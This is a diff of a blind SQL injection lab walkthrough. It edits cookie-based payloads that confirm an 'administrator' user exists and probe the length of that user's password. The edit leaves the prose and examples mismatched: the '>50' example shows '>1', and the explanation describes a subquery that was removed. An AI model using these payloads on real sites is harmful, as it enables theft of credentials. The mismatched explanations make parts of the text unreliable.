@@ -66,12 +66,7 @@ We see a *Welcome back* msg , so it conforms that there is a users table.
 #### Conform that username administrator is present in users table -
 
 ```sql
-SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT username FROM users WHERE username='admnistrator') = 'administrator'--
-```
-OR 
-
-```sql
-SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 ```
 
 ![image](https://user-images.githubusercontent.com/67383098/234822414-89112d5b-720c-4688-b285-a9396bdbbd48.png)
@@ -81,7 +76,7 @@ We confirm that there is a user called `administrator` in the database.
 #### Find the length password of administrator 
 
 ```sql
-SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1 )='administrator'--
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 ```
 
 In particular, the subquery `(SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)` is attempting to retrieve the username of the administrator account whose password is longer than one character. If such an account exists in the database, the subquery will return the value "administrator".
@@ -92,7 +87,7 @@ The outer part of the string `AND (SELECT username FROM users WHERE username='ad
 
 This confirms that the password is greater than 1
 
-If we send the value as  50 ie ` AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>50 )='administrator'--`  , we dont get any welcome message which means its not > 50  characters.
+If we send the value as  50 ie `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`  , we dont get any welcome message which means its not > 50  characters.
 
 ![image](https://user-images.githubusercontent.com/67383098/234827767-30367782-0bbe-4f38-8d2a-15635f1ae154.png)
 
